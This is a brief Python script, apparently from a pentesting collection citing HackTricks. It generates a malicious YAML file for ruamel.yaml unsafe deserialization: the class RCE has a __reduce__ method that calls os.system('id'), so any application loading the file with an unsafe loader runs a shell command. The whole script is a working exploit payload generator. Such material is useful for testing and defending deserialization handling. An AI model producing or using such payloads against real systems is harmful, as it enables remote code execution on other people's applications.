#!/usr/bin/env python3

## References:
## - https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization

from ruamel.yaml import YAML
import os

class RCE:
    def __reduce__(self):
        return (os.system,('id',))

def main():
    output_file = "rce-ruamel.yaml"

    with open(output_file, "w") as fo:
        YAML(typ="unsafe").dump(RCE(),fo)

    print("Payload saved into {}".format(output_file))


if __name__ == "__main__":
    exit(main())
